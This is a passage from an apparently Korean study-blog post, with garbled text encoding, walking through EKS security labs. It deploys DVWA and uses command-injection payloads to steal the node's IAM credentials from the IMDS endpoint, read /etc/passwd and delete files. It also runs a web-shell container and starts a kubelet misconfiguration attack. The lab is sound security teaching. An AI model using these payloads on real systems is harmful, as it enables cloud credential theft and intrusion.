<li>ë§ˆì§€ë§‰ 5-3 ì‹¤ìŠµì˜ ê²½ìš° ê¸°ì¡´ kubeconfigë¥¼ ì‚­ì œí•˜ê¸° ë•Œë¬¸ì—<br>
cloudformation stack ì‚­ì œ ì‹œ, ìˆ˜ë™ ì‘ì—… í•„ìš”í•  ìˆ˜ ìˆìŒ</li>
</ul>
<h3 id="5-1-ì‹¤ìŠµ1-eks-podê°€-imds-apië¥¼-ì•…ìš©í•˜ëŠ”-ì‹œë‚˜ë¦¬ì˜¤">5-1. ì‹¤ìŠµ1: EKS podê°€ IMDS APIë¥¼ ì•…ìš©í•˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤</h3>
<ul>
<li>DVWA í™œìš©: mysql, dvwa, ingress
<ul>
<li>ë°°í¬ í›„ ì›¹ì—ì„œ í™•ì¸ê¹Œì§€ ëŒ€ê¸° ì‹œê°„ ì†Œìš”</li>
</ul>
</li>
</ul>
<p><img src="./images/dvwa-login-page.png" alt="DVWA login page"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># mysql ë°°í¬</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOT &gt; mysql.yaml
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Secret
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-secrets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">type: Opaque
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">data:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # s3r00tpa55
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ROOT_PASSWORD: czNyMDB0cGE1NQ==
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # dvwa
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  DVWA_USERNAME: ZHZ3YQ==
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # p@ssword
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  DVWA_PASSWORD: cEBzc3dvcmQ=
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # dvwa
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  DVWA_DATABASE: ZHZ3YQ==
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Service
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-mysql-service
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    app: dvwa-mysql
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    tier: backend
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ports:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - protocol: TCP
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      port: 3306
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      targetPort: 3306
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: apps/v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Deployment
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-mysql
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  replicas: 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    matchLabels:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      app: dvwa-mysql
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      tier: backend
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  template:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      labels:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        app: dvwa-mysql
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        tier: backend
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - name: mysql
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          image: mariadb:10.1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          resources:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            requests:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              cpu: &#34;0.3&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              memory: 256Mi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            limits:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              cpu: &#34;0.3&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              memory: 256Mi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          ports:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - containerPort: 3306
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          env:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_ROOT_PASSWORD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: ROOT_PASSWORD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_USER
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_USERNAME
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_PASSWORD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_PASSWORD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_DATABASE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_DATABASE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOT</span>
</span></span><span style="display:flex;"><span>kubectl apply -f mysql.yaml
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># DVWA ë°°í¬</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOT &gt; dvwa.yaml
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: ConfigMap
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-config
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">data:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  RECAPTCHA_PRIV_KEY: &#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  RECAPTCHA_PUB_KEY: &#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SECURITY_LEVEL: &#34;low&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  PHPIDS_ENABLED: &#34;0&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  PHPIDS_VERBOSE: &#34;1&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  PHP_DISPLAY_ERRORS: &#34;1&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Service
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-web-service
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    app: dvwa-web
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  type: ClusterIP
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ports:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - protocol: TCP
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      port: 80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      targetPort: 80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: apps/v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Deployment
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-web
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  replicas: 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    matchLabels:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      app: dvwa-web
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  template:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      labels:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        app: dvwa-web
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - name: dvwa
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          image: cytopia/dvwa:php-8.1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          ports:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - containerPort: 80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          resources:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            requests:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              cpu: &#34;0.3&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              memory: 256Mi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            limits:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              cpu: &#34;0.3&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              memory: 256Mi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          env:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: RECAPTCHA_PRIV_KEY
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: RECAPTCHA_PRIV_KEY
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: RECAPTCHA_PUB_KEY
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: RECAPTCHA_PUB_KEY
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: SECURITY_LEVEL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: SECURITY_LEVEL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: PHPIDS_ENABLED
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: PHPIDS_ENABLED
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: PHPIDS_VERBOSE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: PHPIDS_VERBOSE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: PHP_DISPLAY_ERRORS
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: PHP_DISPLAY_ERRORS
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_HOSTNAME
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              value: dvwa-mysql-service
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_DATABASE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_DATABASE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_USERNAME
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_USERNAME
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_PASSWORD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_PASSWORD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOT</span>
</span></span><span style="display:flex;"><span>kubectl apply -f dvwa.yaml
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ingress ë°°í¬</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOT &gt; dvwa-ingress.yaml
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: networking.k8s.io/v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Ingress
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  annotations:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/group.name: study
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/listen-ports: &#39;[{&#34;HTTPS&#34;:443}, {&#34;HTTP&#34;:80}]&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/scheme: internet-facing
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/ssl-redirect: &#34;443&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/success-codes: 200-399
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/target-type: ip
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: ingress-dvwa
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ingressClassName: alb
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  rules:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - host: dvwa.$MyDomain
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    http:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      paths:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - backend:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          service:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            name: dvwa-web-service
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            port:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              number: 80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        path: /
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        pathType: Prefix
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOT</span>
</span></span><span style="display:flex;"><span>kubectl apply -f dvwa-ingress.yaml
</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;DVWA Web https://dvwa.</span>$MyDomain<span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><ul>
<li>ì›¹ ì ‘ì† admin / password -&gt; DB êµ¬ì„±ì„ ìœ„í•´ í´ë¦­ (ì¬ë¡œê·¸ì¸) -&gt; admin / password</li>
<li>Command Injection ë©”ë‰´ì—ì„œ ì•„ë˜ì˜ ëª…ë ¹ ì‹¤í–‰</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ëª…ë ¹ ì‹¤í–‰ ê°€ëŠ¥ í™•ì¸</span>
</span></span><span style="display:flex;"><span>8.8.8.8 ; echo ; hostname
</span></span><span style="display:flex;"><span>8.8.8.8 ; echo ; whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># IMDSv2 í† í° í™•ì¸ í›„ ë³µì‚¬</span>
</span></span><span style="display:flex;"><span>8.8.8.8 ; curl -s -X PUT <span style="color:#e6db74">&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># EC2 Instance Profile (IAM Role) ì´ë¦„ í™•ì¸</span>
</span></span><span style="display:flex;"><span>8.8.8.8 ; curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: {IMDSv2 í† í°}&#34;</span> â€“v http://169.254.169.254/latest/meta-data/iam/security-credentials/
</span></span><span style="display:flex;"><span>eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1H30SEASKL5M1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># EC2 Instance Profile (IAM Role) ìê²©ì¦ëª…íƒˆì·¨ ì„±ê³µ</span>
</span></span><span style="display:flex;"><span>8.8.8.8 ; curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: {IMDSv2 í† í°}&#34;</span> â€“v http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1H30SEASKL5M1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ê·¸ì™¸ ë‹¤ì–‘í•œ ëª…ë ¹ ì‹¤í–‰ ê°€ëŠ¥</span>
</span></span><span style="display:flex;"><span>8.8.8.8; cat /etc/passwd
</span></span><span style="display:flex;"><span>8.8.8.8; rm -rf /tmp/*
</span></span></code></pre></div><p><img src="./images/dvwa-command-injection-1.png" alt="DVWA Command Injection 1"></p>
<p><img src="./images/dvwa-command-injection-2.png" alt="DVWA Command Injection 2"></p>
<p><img src="./images/dvwa-command-injection-3.png" alt="DVWA Command Injection 3"></p>
<p><img src="./images/get-ec2-iam-role-success-in-dvwa-low-command-injection-with-imdsv2.png" alt="Get EC2 IAM Role success in DVWA Low Command Injection with IMDSv2"></p>
<h3 id="5-2-ì‹¤ìŠµ2-web-openssh-ì»¨í…Œì´ë„ˆ">5-2. ì‹¤ìŠµ2: Web OpenSSH ì»¨í…Œì´ë„ˆ</h3>
<ul>
<li>HTTPS ë™ì‘ì´ë¼ ë³´ì•ˆì¥ë¹„ê°€ ê²€ì¶œí•˜ê¸° ì–´ë ¤ì›€</li>
<li>ë‹¤ë§Œ, í•´ë‹¹ ì´ë¯¸ì§€ëŠ” alpine ê¸°ë°˜ì—, apk repoë¥¼ mainì—ì„œë§Œ ëŒì–´ì˜¬ ìˆ˜ ìˆê²Œ ì„¸íŒ…
<ul>
<li>í•´ë‹¹ í™˜ê²½ì—ì„œ kubectlë¡œ ì·¨ì•½ì  ê³µê²©í•  ìˆ˜ê°€ ì—†ì–´ì„œ curlë¡œ hostì— ë˜ì ¸ë³´ê¸°ë§Œ í•˜ê³  ì¢…ë£Œ</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">## myeks-bastion-2ì—ì„œ ì‹¤í–‰</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download docker image</span>
</span></span><span style="display:flex;"><span>docker pull ghostplant/webshell
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë¯¸ë¦¬ ì ‘ì†í•  ì£¼ì†Œ ì¶œë ¥</span>
</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;WebOpenSSH https://</span><span style="color:#66d9ef">$(</span>curl -s ipinfo.io/ip<span style="color:#66d9ef">)</span><span style="color:#e6db74">:8443/&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ìƒˆë¡œìš´ ì‰˜(ì˜µì…˜1)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># [ì•”í˜¸X] Run service over HTTPS, no password:</span>
</span></span><span style="display:flex;"><span>docker run -it --rm --net<span style="color:#f92672">=</span>host -e LISTEN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8443 ssl&#34;</span> ghostplant/webshell
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ìƒˆë¡œìš´ ì‰˜(ì˜µì…˜2)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># [ì•”í˜¸O] Run service over HTTPS, with password:</span>
</span></span><span style="display:flex;"><span>docker run -it --rm --net<span style="color:#f92672">=</span>host -e LISTEN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8443 ssl&#34;</span> -e ACCOUNT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin:badmin&#34;</span> ghostplant/webshell
</span></span></code></pre></div><ul>
<li>ì›¹ ì ‘ì† í›„, ì •ë³´ í™•ì¸</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ì •ë³´ í™•ì¸</span>
</span></span><span style="display:flex;"><span>hostname
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>ip addr
</span></span><span style="display:flex;"><span>mount
</span></span><span style="display:flex;"><span>export
</span></span><span style="display:flex;"><span>top
</span></span></code></pre></div><h3 id="5-3-kubelet-ë¯¸í¡í•œ-ì¸ì¦ì¸ê°€-ì„¤ì •-ì‹œ-ìœ„í—˜">5-3. Kubelet ë¯¸í¡í•œ ì¸ì¦/ì¸ê°€ ì„¤ì • ì‹œ ìœ„í—˜</h3>
<ul>
<li>
<p>ë‘ ê°œì˜ bastionì„ ë²ˆê°ˆì•„ê°€ë©° ì§„í–‰</p>
</li>
<li>
<p>ê°€ì¥ ë§ˆì§€ë§‰ì— ë‘” ì´ìœ : ê¸°ì¡´ kubeconfig ì†Œì‹¤</p>
<ul>
<li>ì‹¤ìŠµ ì¢…ë£Œ í›„ cloudfomation stack ì‚­ì œ ì‹œ VPC, EIPë¥¼ ì¤‘ì‹¬ìœ¼ë¡œ ì™„ì „ ì‚­ì œê°€ ë˜ì§€ ì•Šì•„ì„œ ì¼ì¼íˆ ì›¹ì½˜ì†”ì—ì„œ ì‚­ì œí•´ì•¼í•¨</li>
</ul>
</li>
<li>
<p>[my-eks-bastion]</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ë…¸ë“œì˜ kubelet API ì¸ì¦ê³¼ ì¸ê°€ ê´€ë ¨ ì •ë³´ í™•ì¸</span>
</span></span><span style="display:flex;"><span>ssh ec2-user@$N1 cat /etc/kubernetes/kubelet/kubelet-config.json | jq
</span></span><span style="display:flex;"><span>ssh ec2-user@$N1 cat /var/lib/kubelet/kubeconfig | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë…¸ë“œì˜ kubelet ì‚¬ìš© í¬íŠ¸ í™•ì¸ </span>
</span></span><span style="display:flex;"><span>ssh ec2-user@$N1 sudo ss -tnlp | grep kubelet
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë°ëª¨ë¥¼ ìœ„í•´ awscli íŒŒë“œ ìƒì„±</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl apply -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: myawscli
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  #serviceAccountName: my-sa
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: my-aws-cli
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      image: amazon/aws-cli:latest
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      command: [&#39;sleep&#39;, &#39;36000&#39;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  restartPolicy: Never
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ ì‚¬ìš©</span>
</span></span><span style="display:flex;"><span>kubectl exec -it myawscli -- aws sts get-caller-identity --query Arn
</span></span><span style="display:flex;"><span>kubectl exec -it myawscli -- aws s3 ls
</span></span><span style="display:flex;"><span>kubectl exec -it myawscli -- aws ec2 describe-instances --region ap-northeast-2 --output table --no-cli-pager
</span></span><span style="display:flex;"><span>kubectl exec -it myawscli -- aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
</span></span></code></pre></div><p><img src="images/s3-access-denied-with-default-kubelet-config.png" alt="s3 access denied with default kubelet config"></p>
<ul>
<li>[my-eks-bastion-2]</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ê¸°ì¡´ kubeconfig ì‚­ì œ</span>
